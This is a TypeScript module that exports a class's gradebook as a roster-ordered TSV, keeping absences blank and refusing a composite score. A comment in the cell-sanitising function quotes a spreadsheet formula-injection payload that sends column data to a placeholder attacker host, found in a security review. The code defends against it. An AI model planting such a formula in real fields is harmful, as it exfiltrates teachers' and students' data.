import { competencyById, requiredEvidenceRequirementsFor } from "../domain/competency/competencies";
import { isShortfall, levelFor } from "../domain/competency/teachNext";
import type { CompetencyResultState } from "../domain/competency/types";
import { REASONING_MAXIMUM } from "../domain/evidence/grade";
import { REASONING_CRITERIA } from "../domain/blueprint/reasoning";
import { WORLD_REGISTRY } from "../domain/scenario/registry";
import type { AttributedSubmission } from "../platform/classes/types";
import { COMPETENCY_STATE_LABELS } from "./labels";
import { studentSpineFor } from "./studentSpine";
import { worldOfSubmission } from "./objectiveResults";

/**
 * What leaves BOW for a gradebook, and what deliberately does not.
 *
 * There used to be a hundred-point total, with bands at 65, 80 and 90, printed as the line a
 * teacher would copy on a Friday. Three things were wrong with it and each on its own is
 * disqualifying.
 *
 * It **added two different kinds of thing together**: ninety points of machine observation,
 * support-capped, and ten points a person typed after reading a paragraph. A single number
 * over that sum cannot be traced to either.
 *
 * It **turned absences into zeros**. The points were summed as `points ?? 0`, so a student
 * who stopped after the opening plan read `37 of 90` — a score out of questions nobody asked
 * them — three hundred pixels below the sentence "Absences, not zeros."
 *
 * And it **only existed in one world**. Basketball's eighteen micro-skills are Basketball's;
 * a class that let students choose put a number beside half the room and an explanation
 * beside the other half. Whatever the right answer is, it cannot be a number for one world
 * only — that penalises a student for a choice the product invited them to make.
 *
 * What replaces it is the same in both worlds and every part of it is traceable: which
 * competencies this attempt speaks to and where each landed, how many required requirements
 * were met, missed and **never asked** as three separate counts, and the reasoning marks a
 * person actually recorded, criterion by criterion, out of the maximum they were marking
 * against. There is no composite, because the composite was the thing that could not be
 * defended.
 *
 * And it is shaped like the roster rather than like the submissions table, because the thing
 * a teacher does with it is paste it beside a column of their own. `gradebookTsv` says what
 * that costs when it is not.
 */

export interface GradebookLine {
  seatCode: string;
  /** The teacher's own label for this seat, where their class has a roster. */
  displayName: string | null;
  worldTitle: string;
  sessionId: string;
  submittedAt: number;
  competencies: readonly { competencyId: string; statement: string; state: CompetencyResultState }[];
  /** Required evidence requirements, in three buckets that never collapse into each other. */
  requirements: { met: number; short: number; neverAsked: number };
  /**
   * The one number that leaves, and it is a person's own.
   *
   * `null` until somebody has read the writing. Absent is not zero here either: a teacher
   * exporting on Friday sees a blank and knows what it means.
   */
  reasoning: { total: number | null; maximum: number; criteria: readonly { id: string; label: string; mark: number | null; maximum: number }[] };
  /** How many judgements on this attempt the teacher has recorded a different reading of. */
  teacherReadings: number;
}

export function gradebookLineFor(submission: AttributedSubmission, displayName: string | null): GradebookLine {
  const spine = studentSpineFor(submission);
  const required = spine.competencies.flatMap((line) => requiredEvidenceRequirementsFor(line.competencyId));
  let met = 0;
  let short = 0;
  let neverAsked = 0;
  for (const requirement of required) {
    const level = levelFor(spine.results, requirement.id);
    if (level === null) neverAsked += 1;
    else if (isShortfall(level)) short += 1;
    else met += 1;
  }
  return {
    seatCode: submission.seatCode,
    displayName,
    worldTitle: WORLD_REGISTRY[worldOfSubmission(submission)]?.title ?? worldOfSubmission(submission),
    sessionId: submission.sessionId,
    submittedAt: submission.submittedAt,
    competencies: spine.competencies.map((line) => ({
      competencyId: line.competencyId,
      statement: competencyById(line.competencyId)?.statement ?? line.competencyId,
      state: line.state,
    })),
    requirements: { met, short, neverAsked },
    reasoning: {
      total: submission.reasoningPoints,
      maximum: REASONING_MAXIMUM,
      criteria: REASONING_CRITERIA.map((criterion) => ({
        id: criterion.id,
        label: criterion.label,
        mark: submission.reasoningCriteria?.[criterion.id] ?? null,
        maximum: criterion.max,
      })),
    },
    teacherReadings: submission.overrides?.length ?? 0,
  };
}

/**
 * One seat of the class, as the export is asked for it.
 *
 * The export is built from the roll rather than from the pile of submissions, which is the
 * whole of the fix to what it used to be: a list of records had no way to know about a
 * student who turned nothing in, no way to know a seat had been taken off the roster, and no
 * way to say that two rows were one child twice.
 */
export interface GradebookSeat {
  seatCode: string;
  /** The teacher's own label for this seat. `null` where the class has no roster. */
  displayName: string | null;
  /** Every attempt this seat turned in, oldest first. Empty is an absence, and gets a blank row. */
  attempts: readonly AttributedSubmission[];
}

/**
 * One line of the paste.
 *
 * A row per seat, plus a row per additional attempt. `line` is `null` for a student who
 * turned nothing in — an absence is a row with a name on it and nothing after it, because a
 * teacher pasting this beside their own roster column needs the rows to line up, and a
 * missing line is a silent off-by-one from that student down.
 */
export interface GradebookRow {
  seatCode: string;
  displayName: string | null;
  /** Which of this seat's attempts this row is, 1-based. `null` where there are none. */
  attempt: number | null;
  line: GradebookLine | null;
}

/** The roll, in seat order, one row per seat and one more per extra attempt. */
export function gradebookRows(seats: readonly GradebookSeat[]): GradebookRow[] {
  return seats.flatMap((seat): GradebookRow[] => {
    if (seat.attempts.length === 0) {
      return [{ seatCode: seat.seatCode, displayName: seat.displayName, attempt: null, line: null }];
    }
    return seat.attempts.map((submission, index) => ({
      seatCode: seat.seatCode,
      displayName: seat.displayName,
      attempt: index + 1,
      line: gradebookLineFor(submission, seat.displayName),
    }));
  });
}

/**
 * The class, as a spreadsheet.
 *
 * Tab-separated because that is what pastes into a gradebook column without anybody choosing
 * a delimiter, and because a comma inside a competency statement should not become a column.
 * Every cell is a fact with a name on it; there is no derived total and no rank.
 *
 * Three properties this has to keep, each of which it was missing:
 *
 * **It is the roster, in seat order.** Every seat in the class gets a row whether or not they
 * turned anything in, and a seat the teacher removed gets none. What arrives is the shape of
 * the list the teacher is pasting beside.
 *
 * **Two attempts are two rows that say which is which.** `Attempt` is the column that was
 * missing while `sessionId` was computed and thrown away, and the session id is here too, so
 * a row can be traced back to the run it came from.
 *
 * **A blank is a blank.** A criterion nobody has marked, and every cell of a student who was
 * not there, are empty rather than `0`. It is the same rule as everywhere else in this
 * product and it matters most here, because this is the one artefact that leaves BOW and gets
 * pasted somewhere nothing can explain it.
 *
 * The competency columns are the union of every competency any row speaks to, in the order
 * they first appear, and a row that has nothing to say about one leaves it empty. Reading
 * them off the first line put a short run's two answers under a full run's three headings.
 */
export function gradebookTsv(rows: readonly GradebookRow[]): string {
  const criteria = REASONING_CRITERIA;
  const competencies: { competencyId: string; statement: string }[] = [];
  for (const row of rows) {
    for (const entry of row.line?.competencies ?? []) {
      if (!competencies.some((known) => known.competencyId === entry.competencyId)) {
        competencies.push({ competencyId: entry.competencyId, statement: entry.statement });
      }
    }
  }

  const header = [
    "Seat", "Student", "Attempt", "World", "Turned in",
    "Requirements met", "Requirements short", "Never asked",
    ...criteria.map((criterion) => `${criterion.label} (/${criterion.max})`),
    `Reasoning (/${REASONING_MAXIMUM})`,
    "Teacher readings",
    ...competencies.map((entry) => entry.statement),
    "Session",
  ];

  const cells = rows.map((row) => {
    const line = row.line;
    if (!line) {
      // An absence, and every cell of it is empty on purpose. The seat and the name are the
      // only two things BOW knows about this student's Friday.
      return [row.seatCode, row.displayName ?? "", ...header.slice(2).map(() => "")];
    }
    return [
      row.seatCode,
      row.displayName ?? "",
      row.attempt === null ? "" : String(row.attempt),
      line.worldTitle,
      new Date(line.submittedAt).toISOString().slice(0, 10),
      String(line.requirements.met),
      String(line.requirements.short),
      String(line.requirements.neverAsked),
      ...criteria.map((criterion) => {
        const mark = line.reasoning.criteria.find((entry) => entry.id === criterion.id)?.mark;
        return mark === null || mark === undefined ? "" : String(mark);
      }),
      line.reasoning.total === null ? "" : String(line.reasoning.total),
      String(line.teacherReadings),
      ...competencies.map((column) => {
        const entry = line.competencies.find((item) => item.competencyId === column.competencyId);
        return entry ? COMPETENCY_STATE_LABELS[entry.state] : "";
      }),
      line.sessionId,
    ];
  });

  return [header, ...cells].map((row) => row.map(safeCell).join("\t")).join("\n");
}

/**
 * One cell, safe to paste into a spreadsheet.
 *
 * Tabs and newlines go because they would move the cell. The leading apostrophe is the other
 * half, and it is there because a name is student-controlled: in a class with no list a student
 * types their own label, and a security review self-named as
 * `=HYPERLINK("http://evil.example/?"&A1,"grade")`, which BOW stored verbatim and put in a
 * gradebook cell. A teacher pressing "Copy for a gradebook" and pasting into Sheets then has a
 * live formula reading their column. Modern spreadsheets warn on paste; a school product should
 * not be relying on the warning.
 */
function safeCell(cell: string): string {
  const flattened = cell.replace(/[\t\n\r]+/g, " ");
  return /^[=+\-@\t\r]/.test(flattened) ? `'${flattened}` : flattened;
}
